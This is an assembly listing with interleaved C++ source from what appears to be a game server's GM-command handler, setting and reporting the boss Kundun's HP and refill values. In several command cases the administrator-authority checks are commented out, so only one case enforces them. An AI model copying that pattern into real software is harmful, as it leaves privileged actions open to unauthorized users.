  022d9	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  022dc	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  022e4	85 d2		 test	 edx, edx
  022e6	0f 8c be 00 00
	00		 jl	 $LN207@Management

; 3052 : 						{
; 3053 : 							LPOBJECTSTRUCT lpTargetObj = &gObj[lpObj->VpPlayer[count].number];

  022ec	6b 85 84 fa ff
	ff 0c		 imul	 eax, DWORD PTR _count$73[ebp], 12
  022f3	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  022f6	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  022fe	69 c2 a0 1b 00
	00		 imul	 eax, edx, 7072
  02304	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0230a	89 85 80 fa ff
	ff		 mov	 DWORD PTR _lpTargetObj$72[ebp], eax

; 3054 : 							
; 3055 : 							if( lpTargetObj->Class == 275 )

  02310	8b 85 80 fa ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$72[ebp]
  02316	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  0231d	81 f9 13 01 00
	00		 cmp	 ecx, 275		; 00000113H
  02323	0f 85 81 00 00
	00		 jne	 $LN207@Management

; 3056 : 							{
; 3057 : 								TNotice _Notice(TNOTICE_TYPE_LEFTTOP);

  02329	6a 01		 push	 1
  0232b	8d 8d 70 f9 ff
	ff		 lea	 ecx, DWORD PTR __Notice$71[ebp]
  02331	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 3058 : 								_Notice.SendToUser( lpObj->m_Index, 

  02336	8b 85 80 fa ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$72[ebp]
  0233c	f3 0f 5a 80 c0
	00 00 00	 cvtss2sd xmm0, DWORD PTR [eax+192]
  02344	83 ec 08	 sub	 esp, 8
  02347	f2 0f 11 04 24	 movsd	 QWORD PTR [esp], xmm0
  0234c	8b 8d 80 fa ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$72[ebp]
  02352	f3 0f 5a 81 bc
	00 00 00	 cvtss2sd xmm0, DWORD PTR [ecx+188]
  0235a	83 ec 08	 sub	 esp, 8
  0235d	f2 0f 11 04 24	 movsd	 QWORD PTR [esp], xmm0
  02362	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@FABGHCEJ@?D?o?$LF?P?5HP?5?$DN?5?$CF7?40f?5?1?5?$CF7?40f@
  02367	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0236a	8b 02		 mov	 eax, DWORD PTR [edx]
  0236c	50		 push	 eax
  0236d	8d 8d 70 f9 ff
	ff		 lea	 ecx, DWORD PTR __Notice$71[ebp]
  02373	51		 push	 ecx
  02374	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  02379	83 c4 1c	 add	 esp, 28			; 0000001cH

; 3059 : 									" HP = %7.0f / %7.0f", lpTargetObj->Life,lpTargetObj->MaxLife );
; 3060 : 
; 3061 : 								_Notice.SendToUser( lpObj->m_Index, 

  0237c	a1 00 00 00 00	 mov	 eax, DWORD PTR ?giKundunRefillHPTime@@3HA ; giKundunRefillHPTime
  02381	50		 push	 eax
  02382	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?giKundunRefillHP@@3HA ; giKundunRefillHP
  02388	51		 push	 ecx
  02389	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?giKundunRefillHPSec@@3HA ; giKundunRefillHPSec
  0238f	52		 push	 edx
  02390	68 00 00 00 00	 push	 OFFSET ??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@
  02395	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02398	8b 08		 mov	 ecx, DWORD PTR [eax]
  0239a	51		 push	 ecx
  0239b	8d 95 70 f9 ff
	ff		 lea	 edx, DWORD PTR __Notice$71[ebp]
  023a1	52		 push	 edx
  023a2	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  023a7	83 c4 18	 add	 esp, 24			; 00000018H
$LN207@Management:

; 3062 : 									" HP  = %d  = %d  = %d", 
; 3063 : 									giKundunRefillHPSec, giKundunRefillHP, giKundunRefillHPTime );
; 3064 : 							}
; 3065 : 						}
; 3066 : 					}
; 3067 : 					
; 3068 : 				}
; 3069 : 			}

  023aa	e9 d2 fe ff ff	 jmp	 $LN43@Management
$LN44@Management:

; 3070 : 			
; 3071 : 		}
; 3072 : 		break;

  023af	e9 08 19 00 00	 jmp	 $LN2@Management
$LN208@Management:

; 3073 : 	//------------------------------------------------------------------------
; 3074 : 	//  HP 
; 3075 : 	case GMCMD_SETKUNDUNHP :
; 3076 : 		{
; 3077 : /*
; 3078 : #if (TESTSERVER==0)
; 3079 : 			if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN ) 
; 3080 : 				return 0;
; 3081 : #endif
; 3082 : */
; 3083 : //------------->
; 3084 : // Admin, EventGm    20081215 (grooving)
; 3085 : #ifdef MODIFIY_AUTHORITY_INTERGRATION_20081215
; 3086 : 			if(CheckAuthority(AUTHORITY_SUPER_ADMIN | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM, &gObj[aIndex]) == false) break;
; 3087 : #else // MODIFIY_AUTHORITY_INTERGRATION_20081215
; 3088 : 			if(CheckAuthority(AUTHORITY_SUPER_ADMIN | AUTHORITY_ADMIN, &gObj[aIndex]) == false) break;

  023b4	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  023bb	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  023c1	50		 push	 eax
  023c2	6a 42		 push	 66			; 00000042H
  023c4	e8 00 00 00 00	 call	 ?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z ; CheckAuthority
  023c9	83 c4 08	 add	 esp, 8
  023cc	0f b6 c8	 movzx	 ecx, al
  023cf	85 c9		 test	 ecx, ecx
  023d1	75 05		 jne	 SHORT $LN209@Management
  023d3	e9 e4 18 00 00	 jmp	 $LN2@Management
$LN209@Management:

; 3089 : #endif// MODIFIY_AUTHORITY_INTERGRATION_20081215
; 3090 : //<-------------
; 3091 : 			
; 3092 : #ifdef ADD_LOG_GM_COMMAND_20040420
; 3093 : 			LogAddTD( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  023d8	68 00 00 00 00	 push	 OFFSET ??_C@_0L@LMJDAGMB@?D?o?$LF?PHP?$LM?$LD?A?$KE@
  023dd	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  023e0	83 c0 73	 add	 eax, 115		; 00000073H
  023e3	50		 push	 eax
  023e4	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  023e7	83 c1 68	 add	 ecx, 104		; 00000068H
  023ea	51		 push	 ecx
  023eb	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  023ee	83 c2 18	 add	 edx, 24			; 00000018H
  023f1	52		 push	 edx
  023f2	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  023f7	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  023fd	83 c4 14	 add	 esp, 20			; 00000014H

; 3094 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3095 : 
; 3096 : 			KUNDUN_GM_LOG.Output( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  02400	68 00 00 00 00	 push	 OFFSET ??_C@_0L@LMJDAGMB@?D?o?$LF?PHP?$LM?$LD?A?$KE@
  02405	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02408	83 c0 73	 add	 eax, 115		; 00000073H
  0240b	50		 push	 eax
  0240c	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0240f	83 c1 68	 add	 ecx, 104		; 00000068H
  02412	51		 push	 ecx
  02413	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02416	83 c2 18	 add	 edx, 24			; 00000018H
  02419	52		 push	 edx
  0241a	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  0241f	68 00 00 00 00	 push	 OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  02424	e8 00 00 00 00	 call	 ?Output@CLogToFile@@QAAXPADZZ ; CLogToFile::Output
  02429	83 c4 18	 add	 esp, 24			; 00000018H

; 3097 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3098 : #endif
; 3099 : 
; 3100 : 			int iKundunHP = GetTokenNumber();

  0242c	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0242f	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02434	89 85 6c f9 ff
	ff		 mov	 DWORD PTR _iKundunHP$70[ebp], eax

; 3101 : 
; 3102 : 			for( int count=0; count < MAXVIEWPORTOBJECT; count++ )

  0243a	c7 85 68 f9 ff
	ff 00 00 00 00	 mov	 DWORD PTR _count$69[ebp], 0
  02444	eb 0f		 jmp	 SHORT $LN48@Management
$LN46@Management:
  02446	8b 85 68 f9 ff
	ff		 mov	 eax, DWORD PTR _count$69[ebp]
  0244c	83 c0 01	 add	 eax, 1
  0244f	89 85 68 f9 ff
	ff		 mov	 DWORD PTR _count$69[ebp], eax
$LN48@Management:
  02455	83 bd 68 f9 ff
	ff 4b		 cmp	 DWORD PTR _count$69[ebp], 75 ; 0000004bH
  0245c	0f 8d 3b 01 00
	00		 jge	 $LN47@Management

; 3103 : 			{
; 3104 : 				if( lpObj->VpPlayer[count].state )

  02462	6b 85 68 f9 ff
	ff 0c		 imul	 eax, DWORD PTR _count$69[ebp], 12
  02469	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0246c	0f be 94 01 64
	03 00 00	 movsx	 edx, BYTE PTR [ecx+eax+868]
  02474	85 d2		 test	 edx, edx
  02476	0f 84 1c 01 00
	00		 je	 $LN213@Management

; 3105 : 				{
; 3106 : 					if( lpObj->VpPlayer[count].type == OBJTYPE_MONSTER )

  0247c	6b 85 68 f9 ff
	ff 0c		 imul	 eax, DWORD PTR _count$69[ebp], 12
  02483	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02486	0f b6 94 01 68
	03 00 00	 movzx	 edx, BYTE PTR [ecx+eax+872]
  0248e	83 fa 02	 cmp	 edx, 2
  02491	0f 85 01 01 00
	00		 jne	 $LN213@Management

; 3107 : 					{
; 3108 : 						if( lpObj->VpPlayer[count].number >= 0 )

  02497	6b 85 68 f9 ff
	ff 0c		 imul	 eax, DWORD PTR _count$69[ebp], 12
  0249e	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  024a1	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  024a9	85 d2		 test	 edx, edx
  024ab	0f 8c e7 00 00
	00		 jl	 $LN213@Management

; 3109 : 						{
; 3110 : 							LPOBJECTSTRUCT lpTargetObj = &gObj[lpObj->VpPlayer[count].number];

  024b1	6b 85 68 f9 ff
	ff 0c		 imul	 eax, DWORD PTR _count$69[ebp], 12
  024b8	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  024bb	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  024c3	69 c2 a0 1b 00
	00		 imul	 eax, edx, 7072
  024c9	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  024cf	89 85 64 f9 ff
	ff		 mov	 DWORD PTR _lpTargetObj$68[ebp], eax

; 3111 : 							
; 3112 : 							if( lpTargetObj->Class == 275 )

  024d5	8b 85 64 f9 ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$68[ebp]
  024db	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  024e2	81 f9 13 01 00
	00		 cmp	 ecx, 275		; 00000113H
  024e8	0f 85 aa 00 00
	00		 jne	 $LN213@Management

; 3113 : 							{
; 3114 : 								if( iKundunHP <= 5000 )

  024ee	81 bd 6c f9 ff
	ff 88 13 00 00	 cmp	 DWORD PTR _iKundunHP$70[ebp], 5000 ; 00001388H
  024f8	7f 0a		 jg	 SHORT $LN214@Management

; 3115 : 									iKundunHP = 5000;

  024fa	c7 85 6c f9 ff
	ff 88 13 00 00	 mov	 DWORD PTR _iKundunHP$70[ebp], 5000 ; 00001388H
$LN214@Management:

; 3116 : 
; 3117 : 								if( iKundunHP > lpTargetObj->MaxLife )

  02504	f3 0f 2a 85 6c
	f9 ff ff	 cvtsi2ss xmm0, DWORD PTR _iKundunHP$70[ebp]
  0250c	8b 85 64 f9 ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$68[ebp]
  02512	0f 2f 80 c0 00
	00 00		 comiss	 xmm0, DWORD PTR [eax+192]
  02519	76 14		 jbe	 SHORT $LN215@Management

; 3118 : 									iKundunHP = lpTargetObj->MaxLife;

  0251b	8b 85 64 f9 ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$68[ebp]
  02521	f3 0f 2c 88 c0
	00 00 00	 cvttss2si ecx, DWORD PTR [eax+192]
  02529	89 8d 6c f9 ff
	ff		 mov	 DWORD PTR _iKundunHP$70[ebp], ecx
$LN215@Management:

; 3119 : 
; 3120 : 								lpTargetObj->Life = iKundunHP;

  0252f	f3 0f 2a 85 6c
	f9 ff ff	 cvtsi2ss xmm0, DWORD PTR _iKundunHP$70[ebp]
  02537	8b 85 64 f9 ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$68[ebp]
  0253d	f3 0f 11 80 bc
	00 00 00	 movss	 DWORD PTR [eax+188], xmm0

; 3121 : 							
; 3122 : 								TNotice _Notice(TNOTICE_TYPE_LEFTTOP);

  02545	6a 01		 push	 1
  02547	8d 8d 54 f8 ff
	ff		 lea	 ecx, DWORD PTR __Notice$67[ebp]
  0254d	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 3123 : 								_Notice.SendToUser( lpObj->m_Index, 

  02552	8b 85 64 f9 ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$68[ebp]
  02558	f3 0f 5a 80 c0
	00 00 00	 cvtss2sd xmm0, DWORD PTR [eax+192]
  02560	83 ec 08	 sub	 esp, 8
  02563	f2 0f 11 04 24	 movsd	 QWORD PTR [esp], xmm0
  02568	8b 8d 64 f9 ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$68[ebp]
  0256e	f3 0f 5a 81 bc
	00 00 00	 cvtss2sd xmm0, DWORD PTR [ecx+188]
  02576	83 ec 08	 sub	 esp, 8
  02579	f2 0f 11 04 24	 movsd	 QWORD PTR [esp], xmm0
  0257e	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@FABGHCEJ@?D?o?$LF?P?5HP?5?$DN?5?$CF7?40f?5?1?5?$CF7?40f@
  02583	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02586	8b 02		 mov	 eax, DWORD PTR [edx]
  02588	50		 push	 eax
  02589	8d 8d 54 f8 ff
	ff		 lea	 ecx, DWORD PTR __Notice$67[ebp]
  0258f	51		 push	 ecx
  02590	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  02595	83 c4 1c	 add	 esp, 28			; 0000001cH
$LN213@Management:

; 3124 : 									" HP = %7.0f / %7.0f", lpTargetObj->Life,lpTargetObj->MaxLife );
; 3125 : 							}
; 3126 : 						}
; 3127 : 					}
; 3128 : 					
; 3129 : 				}
; 3130 : 			}

  02598	e9 a9 fe ff ff	 jmp	 $LN46@Management
$LN47@Management:

; 3131 : 
; 3132 : 		}
; 3133 : 		break;

  0259d	e9 1a 17 00 00	 jmp	 $LN2@Management
$LN216@Management:

; 3134 : 	//------------------------------------------------------------------------
; 3135 : 	//    
; 3136 : 	case GMCMD_SETKUNDUNREFILLHP:
; 3137 : 		{
; 3138 : /*
; 3139 : #if (TESTSERVER==0)
; 3140 : 			if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN ) 
; 3141 : 				return 0;
; 3142 : #endif
; 3143 : */
; 3144 : 
; 3145 : #ifdef ADD_LOG_GM_COMMAND_20040420
; 3146 : 			LogAddTD( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  025a2	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@FDCEFCLA@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@
  025a7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  025aa	83 c0 73	 add	 eax, 115		; 00000073H
  025ad	50		 push	 eax
  025ae	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  025b1	83 c1 68	 add	 ecx, 104		; 00000068H
  025b4	51		 push	 ecx
  025b5	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  025b8	83 c2 18	 add	 edx, 24			; 00000018H
  025bb	52		 push	 edx
  025bc	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  025c1	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  025c7	83 c4 14	 add	 esp, 20			; 00000014H

; 3147 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3148 : 			
; 3149 : 			KUNDUN_GM_LOG.Output( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  025ca	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@FDCEFCLA@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@
  025cf	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  025d2	83 c0 73	 add	 eax, 115		; 00000073H
  025d5	50		 push	 eax
  025d6	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  025d9	83 c1 68	 add	 ecx, 104		; 00000068H
  025dc	51		 push	 ecx
  025dd	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  025e0	83 c2 18	 add	 edx, 24			; 00000018H
  025e3	52		 push	 edx
  025e4	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  025e9	68 00 00 00 00	 push	 OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  025ee	e8 00 00 00 00	 call	 ?Output@CLogToFile@@QAAXPADZZ ; CLogToFile::Output
  025f3	83 c4 18	 add	 esp, 24			; 00000018H

; 3150 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3151 : #endif
; 3152 : 			
; 3153 : 			int iKundunHP = GetTokenNumber();

  025f6	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  025f9	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  025fe	89 85 50 f8 ff
	ff		 mov	 DWORD PTR _iKundunHP$66[ebp], eax

; 3154 : 			
; 3155 : 			if( iKundunHP <= 0 || iKundunHP > 5000000 )	

  02604	83 bd 50 f8 ff
	ff 00		 cmp	 DWORD PTR _iKundunHP$66[ebp], 0
  0260b	7e 0c		 jle	 SHORT $LN218@Management
  0260d	81 bd 50 f8 ff
	ff 40 4b 4c 00	 cmp	 DWORD PTR _iKundunHP$66[ebp], 5000000 ; 004c4b40H
  02617	7e 07		 jle	 SHORT $LN217@Management
$LN218@Management:

; 3156 : 				return 0;

  02619	33 c0		 xor	 eax, eax
  0261b	e9 9e 16 00 00	 jmp	 $LN1@Management
$LN217@Management:

; 3157 : 
; 3158 : 			giKundunRefillHP = iKundunHP;

  02620	8b 85 50 f8 ff
	ff		 mov	 eax, DWORD PTR _iKundunHP$66[ebp]
  02626	a3 00 00 00 00	 mov	 DWORD PTR ?giKundunRefillHP@@3HA, eax ; giKundunRefillHP

; 3159 : 
; 3160 : 			TNotice _Notice;

  0262b	6a 00		 push	 0
  0262d	8d 8d 40 f7 ff
	ff		 lea	 ecx, DWORD PTR __Notice$65[ebp]
  02633	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 3161 : 			_Notice.SendToUser( lpObj->m_Index, " HP  = %d  = %d  = %d", 

  02638	a1 00 00 00 00	 mov	 eax, DWORD PTR ?giKundunRefillHPTime@@3HA ; giKundunRefillHPTime
  0263d	50		 push	 eax
  0263e	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?giKundunRefillHP@@3HA ; giKundunRefillHP
  02644	51		 push	 ecx
  02645	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?giKundunRefillHPSec@@3HA ; giKundunRefillHPSec
  0264b	52		 push	 edx
  0264c	68 00 00 00 00	 push	 OFFSET ??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@
  02651	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02654	8b 08		 mov	 ecx, DWORD PTR [eax]
  02656	51		 push	 ecx
  02657	8d 95 40 f7 ff
	ff		 lea	 edx, DWORD PTR __Notice$65[ebp]
  0265d	52		 push	 edx
  0265e	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  02663	83 c4 18	 add	 esp, 24			; 00000018H

; 3162 : 				giKundunRefillHPSec, giKundunRefillHP, giKundunRefillHPTime );
; 3163 : 		}
; 3164 : 		break;

  02666	e9 51 16 00 00	 jmp	 $LN2@Management
$LN219@Management:

; 3165 : 	//------------------------------------------------------------------------
; 3166 : 	//     
; 3167 : 	case GMCMD_SETKUNDUNREFILLHPSEC:
; 3168 : 		{
; 3169 : /*
; 3170 : #if (TESTSERVER==0)
; 3171 : 			if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN ) 
; 3172 : 				return 0;
; 3173 : #endif
; 3174 : */			
; 3175 : #ifdef ADD_LOG_GM_COMMAND_20040420
; 3176 : 			LogAddTD( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  0266b	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@IAPMHEEM@?D?o?$LF?PHP?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@
  02670	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02673	83 c0 73	 add	 eax, 115		; 00000073H
  02676	50		 push	 eax
  02677	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0267a	83 c1 68	 add	 ecx, 104		; 00000068H
  0267d	51		 push	 ecx
  0267e	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02681	83 c2 18	 add	 edx, 24			; 00000018H
  02684	52		 push	 edx
  02685	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  0268a	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  02690	83 c4 14	 add	 esp, 20			; 00000014H

; 3177 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3178 : 
; 3179 : 			KUNDUN_GM_LOG.Output( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  02693	68 00 00 00 00	 push	 OFFSET ??_C@_0BF@IAPMHEEM@?D?o?$LF?PHP?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@
  02698	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0269b	83 c0 73	 add	 eax, 115		; 00000073H
  0269e	50		 push	 eax
  0269f	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  026a2	83 c1 68	 add	 ecx, 104		; 00000068H
  026a5	51		 push	 ecx
  026a6	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  026a9	83 c2 18	 add	 edx, 24			; 00000018H
  026ac	52		 push	 edx
  026ad	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  026b2	68 00 00 00 00	 push	 OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  026b7	e8 00 00 00 00	 call	 ?Output@CLogToFile@@QAAXPADZZ ; CLogToFile::Output
  026bc	83 c4 18	 add	 esp, 24			; 00000018H

; 3180 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3181 : #endif
; 3182 : 
; 3183 : 			int iKundunHPSec = GetTokenNumber();

  026bf	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  026c2	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  026c7	89 85 3c f7 ff
	ff		 mov	 DWORD PTR _iKundunHPSec$64[ebp], eax

; 3184 : 			
; 3185 : 			if( iKundunHPSec <= 0 || iKundunHPSec > 10000 )	

  026cd	83 bd 3c f7 ff
	ff 00		 cmp	 DWORD PTR _iKundunHPSec$64[ebp], 0
  026d4	7e 0c		 jle	 SHORT $LN221@Management
  026d6	81 bd 3c f7 ff
	ff 10 27 00 00	 cmp	 DWORD PTR _iKundunHPSec$64[ebp], 10000 ; 00002710H
  026e0	7e 07		 jle	 SHORT $LN220@Management
$LN221@Management:

; 3186 : 				return 0;

  026e2	33 c0		 xor	 eax, eax
  026e4	e9 d5 15 00 00	 jmp	 $LN1@Management
$LN220@Management:

; 3187 : 
; 3188 : 			giKundunRefillHPSec = iKundunHPSec;

  026e9	8b 85 3c f7 ff
	ff		 mov	 eax, DWORD PTR _iKundunHPSec$64[ebp]
  026ef	a3 00 00 00 00	 mov	 DWORD PTR ?giKundunRefillHPSec@@3HA, eax ; giKundunRefillHPSec

; 3189 : 
; 3190 : 			TNotice _Notice;

  026f4	6a 00		 push	 0
  026f6	8d 8d 2c f6 ff
	ff		 lea	 ecx, DWORD PTR __Notice$63[ebp]
  026fc	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 3191 : 			_Notice.SendToUser( lpObj->m_Index, " HP  = %d  = %d  = %d", 

  02701	a1 00 00 00 00	 mov	 eax, DWORD PTR ?giKundunRefillHPTime@@3HA ; giKundunRefillHPTime
  02706	50		 push	 eax
  02707	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?giKundunRefillHP@@3HA ; giKundunRefillHP
  0270d	51		 push	 ecx
  0270e	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?giKundunRefillHPSec@@3HA ; giKundunRefillHPSec
  02714	52		 push	 edx
  02715	68 00 00 00 00	 push	 OFFSET ??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@
  0271a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0271d	8b 08		 mov	 ecx, DWORD PTR [eax]
  0271f	51		 push	 ecx
  02720	8d 95 2c f6 ff
	ff		 lea	 edx, DWORD PTR __Notice$63[ebp]
  02726	52		 push	 edx
  02727	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  0272c	83 c4 18	 add	 esp, 24			; 00000018H

; 3192 : 				giKundunRefillHPSec, giKundunRefillHP, giKundunRefillHPTime );
; 3193 : 
; 3194 : 		}
; 3195 : 		break;

  0272f	e9 88 15 00 00	 jmp	 $LN2@Management
$LN222@Management:

; 3196 : 
; 3197 : 	//------------------------------------------------------------------------
; 3198 : 	//    
; 3199 : 	case GMCMD_SETKUNDUNREFILLHPTIME:
; 3200 : 		{
; 3201 : /*
; 3202 : #if (TESTSERVER==0)
; 3203 : 			if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN ) 
; 3204 : 				return 0;
; 3205 : #endif
; 3206 : */
; 3207 : 
; 3208 : #ifdef ADD_LOG_GM_COMMAND_20040420
; 3209 : 			LogAddTD( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  02734	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@ONJMFEJN@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LN?C?$LA?$KD?$LM?$LD?A?$KE@
